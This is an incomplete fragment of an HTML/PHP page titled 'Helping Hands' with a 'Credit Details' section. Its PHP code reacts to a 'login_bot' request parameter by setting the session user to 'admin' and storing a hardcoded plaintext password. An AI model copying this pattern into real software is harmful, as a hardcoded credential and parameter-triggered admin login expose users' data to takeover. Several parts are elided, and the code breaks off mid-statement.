...
<body>	
    ...
    <div id="wrapper">
      <div id="header">
	<h1><font color=yellow>Helping Hands</font></h1>
	<h1 style="float: left;margin-left:20%;opacity:1; -webkit-border-radius: 5px;
   -moz-border-radius: 5px;"><font color='yellow'>Credit Details</font></h1>
   	<ul>
 ...
 <?php
  if(isset($_REQUEST["login_bot"]))
  {
	  ...
	  {
		  $_SESSION["user"]="admin";
		 $_SESSION['pass']='accessgranted@hh';
		echo <<<s
